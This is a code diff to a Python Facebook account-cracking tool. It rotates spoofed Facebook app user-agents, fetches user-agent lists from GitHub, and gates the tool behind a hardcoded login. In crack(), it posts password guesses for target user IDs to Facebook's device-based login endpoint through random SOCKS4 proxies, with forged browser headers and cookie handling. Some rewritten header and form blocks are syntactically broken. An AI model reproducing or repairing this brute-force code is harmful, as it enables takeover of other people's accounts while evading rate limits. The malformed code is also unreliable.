@@ -28,11 +28,11 @@ from rich.text import Text as tekz
 pretty.install()
 CON=sol()
 #------------------[ USER-AGENT ]-------------------#
-ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)Mobile/20F75 [FBAN/FBIOS;FBAV/424.0.0.27.76;FBBV/495870713;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/hu_HU;FBOP/5;FBRV/49854960",]
-ua = ["Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/FB4A;FBAV/979.2.9.20.981;FBPN/com.facebook.katana;FBLC/en_US;FBBV/687217741;FBCR/Glo Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-N986N;FBSV/11;FBCA/x86:armeabi-v7a;FBDM/{density=2.5,width=1080,height=2220};FB_FW/0;FBRV/0;]",]
-ua = ["Mozilla/5.0 (Linux; Android 11; CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]",]
-ua = ["Mozilla/5.0 (Linux; Android 13; 21081111RG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64]",]
-ua = ["Mozilla/5.0 (Linux; Android 11; SM-S205DL Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111;]",]
+ua = "[FBAN/FB4A;FBAV/303.0.0.3.124;FBBV/533556795;FBDM/{density=2.3,width=1080,height=1478};FBLC/en_GB;FBRV/968917366;FBCR/Jazz;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
+ua = "[FBAN/FB4A;FBAV/326.0.0.3.115;FBBV/836847866;FBDM/{density=3.2,width=1080,height=1421};FBLC/en_PK;FBRV/736010837;FBCR/Telenor;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]",
+ua = "[FBAN/FB4A;FBAV/384.0.0.8.140;FBBV/514507241;FBDM/{density=3.3,width=1080,height=1458};FBLC/en_US;FBRV/974470275;FBCR/Vi India;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
+ua = "[FBAN/FB4A;FBAV/201.0.0.4.185;FBBV/721475978;FBDM/{density=3.2,width=1080,height=1430};FBLC/en_GB;FBRV/549098911;FBCR/Jazz;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
+ua = "[FBAN/FB4A;FBAV/369.0.0.9.146;FBBV/754616649;FBDM/{density=2.3,width=1080,height=1458};FBLC/he_IL;FBRV/302189657;FBCR/Telenor;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]",
 ugen2=[]
 ugen=[]
 cokbrut=[]
@@ -98,7 +98,7 @@ def uaku():
 		for ub in ua:
 			ugen.append(ub)
 	except:
-		a=requests.get('https://github.com/SADIM-143/Ua.txt').text
+		a=requests.get('https://github.com/RJ-217/Ua.txt').text
 		ua=open('.bbnew.txt','w')
 		aa=re.findall('line">(.*?)<',str(a))
 		for un in aa:
@@ -161,7 +161,7 @@ while attemps < 12345677901:
     username = input(' \033[0;92mEnter Username: ')
     password = input(' \033[0;93mEnter Password: ')
  
-    if username == 't' and password == 'r':
+    if username == 'r' and password == 'j':
         print(' \033[0;92mYou Have Successfully Logged in.')
         break
     else:
@@ -481,28 +481,30 @@ def crack(idf,pwv):
 		try:
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
-			ses.headers.update('Host', 'm.facebook.com')
-('cache-control', 'max-age=0')
-('upgrade-insecure-requests', '1')
-('origin', 'https://m.facebook.com')
-('content-type', 'application/x-www-form-urlencoded')
-('user-agent', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) 9;  en-us; GT-R797F) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/80.0.4398.123 Mobile/20F75 Puffin/')
-('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9')
-('x-requested-with', 'mark.via.gp')
-('sec-fetch-site', 'same-origin')
-('sec-fetch-mode', 'cors')
-('sec-fetch-user', 'empty')
-('sec-fetch-dest', 'document')
-('referer', 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F')
-('accept-encoding', 'gzip, deflate br')
-('accept-language', 'en-GB,en-US;q=0.9,en;q=0.8')
+			ses.headers.update = {'Host', 'm.facebook.com'
+				 	'cache-control', 'max-age=0'
+					 'upgrade-insecure-requests', '1'
+					 'origin', 'https://m.facebook.com'
+					 'content-type', 'application/x-www-form-urlencoded'
+					 'user-agent', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) 9;  en-us; GT-R797F) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/80.0.4398.123 Mobile/20F75 Puffin/'
+					 'accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9'
+					 'x-requested-with', 'mark.via.gp'
+					 'sec-fetch-site', 'same-origin'
+					 'sec-fetch-mode', 'cors'
+					 'sec-fetch-user', 'empty'
+					 'sec-fetch-dest', 'document'
+					 'referer', 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F'
+					 'accept-encoding', 'gzip, deflate br'
+					 'accept-language', 'en-GB,en-US;q=0.9,en;q=0.8'}
 			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
-			dataa =('lsd', 'AVoj7nCP_fU')
-('jazoest', '2962')
-('uid', '100043635743503')
-('next', 'https://p.facebook.com/login/save-device/')
-('flow', 'login_no_pin')
-('pass', 'mʌʜɘɗɩ123456')
+			dataa = {
+                     'lsd', 'AVoj7nCP_fU'
+					 'jazoest', '2962'
+					 'uid', '100043635743503'
+					 'next', 'https://p.facebook.com/login/save-device/'
+					 'flow', 'login_no_pin'
+					 'pass', 'mʌʜɘɗɩ123456'
+					}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
 			heade = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, sdch', 'accept-language': 'en-US,en;q=0.9'}
